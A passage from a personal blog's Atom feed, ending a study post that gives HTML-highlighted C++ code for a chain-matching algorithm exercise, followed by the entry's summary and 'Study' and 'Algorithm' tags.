h[30];</span><br><span class="line">int l[30];</span><br><span class="line"><span class="keyword">for</span>(int i=0;i&lt;n;i++)</span><br><span class="line">&#123;</span><br><span class="line">cin&gt;&gt;chain[i]&gt;&gt;h[i]&gt;&gt;l[i];</span><br><span class="line">&#125;</span><br><span class="line">char <span class="built_in">test</span>[3][105];</span><br><span class="line"><span class="keyword">for</span>(int i=0;i&lt;m;i++)</span><br><span class="line">&#123;</span><br><span class="line">cin&gt;&gt;<span class="built_in">test</span>[i];</span><br><span class="line">&#125;</span><br><span class="line">int key;</span><br><span class="line"><span class="keyword">for</span>(int i=0;i&lt;m;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(int j=0;j&lt;n;j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">test</span>[i][0]==chain[j])</span><br><span class="line">&#123;</span><br><span class="line">key=j;</span><br><span class="line"><span class="built_in">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">p[0]=h[key];</span><br><span class="line">p[1]=l[key];</span><br><span class="line">int len=strlen(<span class="built_in">test</span>[i]);</span><br><span class="line">int flag=1;</span><br><span class="line"><span class="keyword">for</span>(int k=1;k&lt;len;k++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(int j=0;j&lt;n;j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">test</span>[i][k]==chain[j])</span><br><span class="line">&#123;</span><br><span class="line">key=j;</span><br><span class="line"><span class="built_in">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(p[k]==h[key])</span><br><span class="line">&#123;</span><br><span class="line">p[k+1]=l[key];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">cout&lt;&lt;<span class="string">"MengMengDa"</span>&lt;&lt;endl;</span><br><span class="line">flag=0;</span><br><span class="line"><span class="built_in">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(flag==1)</span><br><span class="line">&#123;</span><br><span class="line">cout&lt;&lt;maxchain(len)&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;&lt;strong&gt;前言&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;最头疼的就是这一块
    
    </summary>
    
      <category term="Study" scheme="https://gardenia30.top/categories/Study/"/>
    
    
      <category term="Algorithm" scheme="https://gardenia30.top/tags/Algorithm/"/>
    
  </entry>
  
</feed>
